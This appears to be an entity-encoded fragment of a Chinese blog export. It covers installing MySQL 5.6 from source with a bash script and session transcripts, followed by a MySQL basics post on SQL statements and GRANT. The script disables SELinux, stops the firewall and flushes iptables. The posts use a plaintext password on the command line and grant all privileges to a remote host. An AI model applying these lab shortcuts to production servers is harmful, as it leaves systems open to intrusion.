0;y&#xA0;&#xFF08;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF09;...&#xA0;Success!Normally,&#xA0;root&#xA0;should&#xA0;only&#xA0;be&#xA0;allowed&#xA0;to&#xA0;connect&#xA0;from&#xA0;&apos;localhost&apos;.&#xA0;Thisensures&#xA0;that&#xA0;someone&#xA0;cannot&#xA0;guess&#xA0;at&#xA0;the&#xA0;root&#xA0;password&#xA0;from&#xA0;the&#xA0;network.Disallow&#xA0;root&#xA0;login&#xA0;remotely?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF09;...&#xA0;Success!By&#xA0;default,&#xA0;MySQL&#xA0;comes&#xA0;with&#xA0;a&#xA0;database&#xA0;named&#xA0;&apos;test&apos;&#xA0;that&#xA0;anyone&#xA0;canaccess.&#xA0;This&#xA0;is&#xA0;also&#xA0;intended&#xA0;only&#xA0;for&#xA0;testing,&#xA0;and&#xA0;should&#xA0;be&#xA0;removedbefore&#xA0;moving&#xA0;into&#xA0;a&#xA0;production&#xA0;environment.Remove&#xA0;test&#xA0;database&#xA0;and&#xA0;access&#xA0;to&#xA0;it?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x5220;&#x9664;test&#x6570;&#x636E;&#x5E93;&#x5E76;&#x53D6;&#x6D88;&#x5BF9;&#x5176;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF09;&#x2010;&#xA0;Dropping&#xA0;test&#xA0;database......&#xA0;Success!&#x2010;&#xA0;Removing&#xA0;privileges&#xA0;on&#xA0;test&#xA0;database......&#xA0;Success!Reloading&#xA0;the&#xA0;privilege&#xA0;tables&#xA0;will&#xA0;ensure&#xA0;that&#xA0;all&#xA0;changes&#xA0;made&#xA0;so&#xA0;farwill&#xA0;take&#xA0;effect&#xA0;immediately.Reload&#xA0;privilege&#xA0;tables&#xA0;now?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x540E;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF09;...&#xA0;Success!All&#xA0;done!&#xA0;If&#xA0;you&apos;ve&#xA0;completed&#xA0;all&#xA0;of&#xA0;the&#xA0;above&#xA0;steps,&#xA0;your&#xA0;MySQLinstallation&#xA0;should&#xA0;now&#xA0;be&#xA0;secure.Thanks&#xA0;for&#xA0;using&#xA0;MySQL!Cleaning&#xA0;up... &#x767B;&#x5F55;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x505A;&#x7B80;&#x5355;&#x64CD;&#x4F5C;&#xFF0C;&#x9A8C;&#x8BC1;&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6B63;&#x5E38;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970 [root@localhost&#xA0;~]#&#xA0;mysql&#xA0;&#x2010;u&#xA0;root&#xA0;&#x2010;p Enter&#xA0;password: Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g. Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;12 Server&#xA0;version:&#xA0;5.6.19&#xA0;Source&#xA0;distribution Copyright&#xA0;(c)&#xA0;2000,&#xA0;2014,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved. Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective owners. Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement. mysql&gt;&#xA0;show&#xA0;databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;Database&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;information_schema&#xA0;| |&#xA0;mysql&#xA0;| |&#xA0;performance_schema&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 3&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec) mysql&gt;&#xA0;create&#xA0;database&#xA0;test; Query&#xA0;OK,&#xA0;1&#xA0;row&#xA0;affected&#xA0;(0.00&#xA0;sec) mysql&gt;&#xA0;show&#xA0;databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;Database&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;information_schema&#xA0;| |&#xA0;mysql&#xA0;| |&#xA0;performance_schema&#xA0;| |&#xA0;test&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 4&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec) mysql&gt;&#xA0;create&#xA0;database&#xA0;test2; Query&#xA0;OK,&#xA0;1&#xA0;row&#xA0;affected&#xA0;(0.00&#xA0;sec) mysql&gt;&#xA0;show&#xA0;databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;Database&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;information_schema&#xA0;| |&#xA0;mysql&#xA0;| |&#xA0;performance_schema&#xA0;| |&#xA0;test&#xA0;| |&#xA0;test2&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 5&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec) mysql&gt;&#xA0;drop&#xA0;database&#xA0;test2; Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected&#xA0;(0.00&#xA0;sec) mysql&gt;&#xA0;show&#xA0;databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;Database&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;information_schema&#xA0;| |&#xA0;mysql&#xA0;| |&#xA0;performance_schema&#xA0;| |&#xA0;test&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 4&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec) mysql&gt; &#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697 [root@localhost src]# vim mysql.sh #!/bin/bash#Explain:This is a script to quickly deploy the MySQL service.#Author:Jaking#Email:Jaking@vip.163.com#Date:2019-10-09#&#x6CE8;&#x610F;:&#x628A;&#x6240;&#x9700;&#x6E90;&#x7801;&#x5305;&#x653E;&#x5230;/usr/local/src&#x76EE;&#x5F55;&#x4E0B;#&#x63A8;&#x8350;&#x5B89;&#x88C5;&#x5305;&#xFF1A;mysql-5.6.19.tar.gz cmake-2.8.11.2.tar.gz#&#x4F18;&#x5316;&#x73AF;&#x5883;sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null#&#x68C0;&#x67E5;yum&#x6E90;&#x662F;&#x5426;&#x914D;&#x7F6E;&#x597D;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x597D;&#x5219;&#x914D;&#x7F6E;yum&#x6E90;yum clean all 1&gt; /dev/null 2&gt;&amp;1 &amp;&amp; yum makecache &amp;&gt; /dev/nullif [ $? -ne 0 ];thencd /etc/yum.repos.dcat &gt;rhel7.repo&lt;&lt;EOF[rhel7]name=rhel7baseurl=file:///media/cdromenabled=1gpgcheck=0EOF mkdir -p /media/cdrom mount /dev/cdrom /media/cdrom &amp;&gt;/dev/null sed -i -e &apos;/iso9660/d&apos; /etc/fstab echo &quot;/dev/cdrom /media/cdrom iso9660 defaults 0 0&quot; &gt;&gt; /etc/fstab yum clean all &amp;&gt;/dev/null &amp;&amp; yum makecache &amp;&gt;/dev/nullfi#&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x5305;&#x53CA;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;yum install -y gcc* make ncurse* perl*#&#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;cd /usr/local/srctar xzvf cmake-2.8.11.2.tar.gzcd cmake-2.8.11.2./configuremake &amp;&amp; make install#&#x90E8;&#x7F72;MySQL&#x6570;&#x636E;&#x5E93;#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql&#x7684;&#x7528;&#x6237;useradd mysql -s /sbin/nologin#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;mysql&#x3002;mkdir -p /usr/local/mysql/varchown -Rf mysql:mysql /usr/local/mysql#&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F;cmake&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-DMYSQL_DATADIR&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR&#x5219;&#x662F;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3002;cd /usr/local/srctar xzvf mysql-5.6.19.tar.gzcd mysql-5.6.19cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/var -DSYSCONFDIR=/etcmake &amp;&amp; make install#&#x4E3A;&#x4E86;&#x8BA9;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664;/etc&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;scripts&#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql_install_db&#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528;--user&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;--basedir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;--datadir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x51FA;&#x65B0;&#x7684;MySQL&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;rm -rf /etc/my.cnfcd /usr/local/mysql./scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var#&#x628A;&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;&#x3002;ln -s my.cnf /etc/my.cnf cp ./support-files/mysql.server /etc/rc.d/init.d/mysqldchmod 755 /etc/rc.d/init.d/mysqld#&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;sed -i &apos;46d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;45 abasedir=/usr/local/mysql&apos; /etc/rc.d/init.d/mysqld sed -i &apos;47d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;46 adatadir=/usr/local/mysql/var&apos; /etc/rc.d/init.d/mysqld#&#x8BBE;&#x7F6E;PATH&#x53D8;&#x91CF;sed -i &apos;74d&apos; /etc/profile &amp;&amp; sed -i &apos;73 aexport PATH=$PATH:/usr/local/mysql/bin&apos; /etc/profile#&#x521B;&#x5EFA;MySQL&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x76EE;&#x5F55;mkdir /var/lib/mysql#&#x521B;&#x5EFA;&#x94FE;&#x63A5;&#x6587;&#x4EF6;ln -s /usr/local/mysql/lib/mysql /usr/lib/mysqlln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock ln -s /usr/local/mysql/include/mysql /usr/include/mysql#&#x542F;&#x52A8;MySQL,&#x628A;mysqld&#x52A0;&#x5165;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;service mysqld startchkconfig mysqld onecho &quot;MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;&quot; &#x6267;&#x884C;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6123456789[root@localhost src]# chmod 755 mysql.sh[root@localhost src]# ./mysql.sh Starting MySQL. SUCCESS! MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;[root@localhost src]# mysql_secure_installation-bash: mysql_secure_installation: command not found[root@localhost src]# [root@localhost src]# source /etc/profileAttempting to create directory /root/perl5 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[root@localhost src]# mysql_secure_installationNOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MySQL SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY!In order to log into MySQL to secure it, we&apos;ll need the currentpassword for the root user. If you&apos;ve just installed MySQL, andyou haven&apos;t set the root password yet, the password will be blank,so you should just press enter here.Enter current password for root (enter for none): &#x76F4;&#x63A5;&#x56DE;&#x8F66;OK, successfully used password, moving on...Setting the root password ensures that nobody can log into the MySQLroot user without the proper authorisation.Set root password? [Y/n] yNew password: Re-enter new password: Password updated successfully!Reloading privilege tables.. ... Success!By default, a MySQL installation has an anonymous user, allowing anyoneto log into MySQL without having to have a user account created forthem. This is intended only for testing, and to make the installationgo a bit smoother. You should remove them before moving into aproduction environment.Remove anonymous users? [Y/n] y ... Success!Normally, root should only be allowed to connect from &apos;localhost&apos;. Thisensures that someone cannot guess at the root password from the network.Disallow root login remotely? [Y/n] y ... Success!By default, MySQL comes with a database named &apos;test&apos; that anyone canaccess. This is also intended only for testing, and should be removedbefore moving into a production environment.Remove test database and access to it? [Y/n] y - Dropping test database... ... Success! - Removing privileges on test database... ... Success!Reloading the privilege tables will ensure that all changes made so farwill take effect immediately.Reload privilege tables now? [Y/n] y ... Success!All done! If you&apos;ve completed all of the above steps, your MySQLinstallation should now be secure.Thanks for using MySQL!Cleaning up... 123456789101112131415161718192021222324252627[root@localhost src]# mysql -uroot -puplookingWarning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 12Server version: 5.6.19 Source distributionCopyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema |+--------------------+3 rows in set (0.00 sec)mysql&gt; exitBye[root@localhost src]# document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL基础","date":"2022-06-07T04:43:21.000Z","path":"/posts/bce68613/","text":"&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;DDL &#x6570;&#x636E;&#x5E93;&#x5B9A;&#x4E49;&#x8BED;&#x8A00; create drop alterDML &#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x8BED;&#x8A00; insert delete updateDCL &#x6570;&#x636E;&#x5E93;&#x63A7;&#x5236;&#x8BED;&#x8A00; grant revokeDQL &#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x8BED;&#x8A00; select &#x672C;&#x7AE0;&#x8981;&#x6C42;&#x638C;&#x63E1;sql&#x8BED;&#x53E5;&#x7684;&#x57FA;&#x672C;&#x7528;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;create database,create table, drop database,drop table,insert into,update,delete from,grant,revoke; &#x5176;&#x4ED6;sql&#x8BED;&#x53E5;&#x4F5C;&#x4E3A;&#x62D3;&#x5C55;&#x3002; MySQL&#x4E2D;&#x7684;&#x8BED;&#x6CD5;&#x683C;&#x5F0F; &#x9ED8;&#x8BA4;&#x4EE5; ; &#x63D0;&#x4EA4; &#x5173;&#x952E;&#x5B57;&#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;&#xFF1B;&#x5E93;&#x540D;&#x3001;&#x8868;&#x540D;&#x3001;&#x6570;&#x636E;&#x90FD;&#x662F;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF1B; &#x4F7F;&#x7528;&#x7A7A;&#x683C; DQL &#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x8BED;&#x8A00; select &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;show databases; &#x67E5;&#x8BE2;&#x8868; show tables; show tables from test; &#x67E5;&#x770B;&#x8868;&#x7684;&#x7ED3;&#x6784; desc mysql.user; &#x67E5;&#x770B;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E; select host,user,password from mysql.user where user=&#x2019;root&#x2019;; -&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013; DDL &#x6570;&#x636E;&#x5E93;&#x5B9A;&#x4E49;&#x8BED;&#x8A00; create drop alter &#x521B;&#x5EFA;&#x5E93; create database dbname; &#x5220;&#x9664;&#x5E93; drop database dbname; &#x521B;&#x5EFA;&#x8868; create table tbname (id int,name char(20),age int); &#x5220;&#x9664;&#x8868; drop table tbname; &#x5E93;&#x540D;&#x8868;&#x540D;&#x547D;&#x540D;&#x89C4;&#x5219; &#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x3001;&#x6570;&#x5B57;&#x3001;&#x4E0B;&#x5212;&#x7EBF; &#x4EE5;&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x5F00;&#x5934; &lt;=32&#x4E2A;&#x5B57;&#x7B26; &#x5207;&#x6362;&#x5230;&#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#xFF1A;12mysql&gt; use dbnameDatabase changed -&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013; DML &#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x8BED;&#x8A00; insert delete update &#x63D2;&#x5165;&#x4E00;&#x884C; insert into dbname.tbname values (1,&#x2019;superman&#x2019;,21); insert into dbname.tbname set id=1,name=&#x2019;superman&#x2019;,age=21; &#x63D2;&#x5165;&#x591A;&#x884C; insert into dbname.tbname values (2,&#x2019;batman1&#x2019;,21),(3,&#x2019;batman2&#x2019;,22),(4,&#x2019;batman3&#x2019;,23),(5,&#x2019;batman4&#x2019;,24); insert into dbname.tbname (id,age) values (6,26); update update dbname.tbname set age=14 where id=2 or id=3; delete delete from dbname.tbname where id=2; -&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013; DCL &#x6570;&#x636E;&#x5E93;&#x63A7;&#x5236;&#x8BED;&#x8A00; grant &#x6388;&#x6743; revoke &#x6536;&#x56DE;&#x6388;&#x6743; grant all on *.* to &apos;batman&apos;@&apos;172.25.0.12&apos; identified by &apos;uplooking&apos;; grant &#x5173;&#x952E;&#x5B57; all &#x6240;&#x6709;&#x6743;&#x9650;&#x9664;&#x4E86;grant&#x4E4B;&#x5916; on . &#x6240;&#x6709;&#x7684;&#x5E93;&#x6240;&#x6709;&#x7684;&#x8868; to user@host &#x6743;&#x9650;&#x662F;&#x7ED9;&#x8C01;&#x7684;&#xFF0C;&#x4ECE;&#x54EA;&#x91CC;&#x6765;&#x7684; identified by &#x5BC6;&#x7801; flush privileges; &#x5237;&#x65B0;&#x6388;&#x6743;&#x8868; &#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5B58;&#x50A8;&#x5F15;&#x64CE; &#x6570;&#x636E;&#x5E93;&#x8BFB;&#x5199;&#x6570;&#x636E;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x51B3;&#x5B9A;&#x4E86;&#x8BFB;&#x5199;&#x6570;&#x636E;&#x7684;&#x5FEB;&#x6162; &#x4E8B;&#x52A1; &#x9501;&#x673A;&#x5236; &#x9002;&#x7528;&#x573A;&#x666F; myisam no &#x8868;&#x9501; &#x5206;&#x6790;&#x578B; innodb | yes | &#x884C;&#x9501; | &#x91D1;&#x94B1;+&#x7EBF;&#x4E0A;&#x9AD8;&#x5E76;&#x53D1; | &#x4E09;&#x3001;&#x4E8B;&#x52A1;&#x4E8B;&#x52A1;(Transaction)&#x662F;&#x5E76;&#x53D1;&#x63A7;&#x5236;&#x7684;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#x3002; &#x6240;&#x8C13;&#x4E8B;&#x52A1;,&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x5E8F;&#x5217;,&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x8981;&#x4E48;&#x90FD;&#x6267;&#x884C;,&#x8981;&#x4E48;&#x90FD;&#x4E0D;&#x6267;&#x884C;, 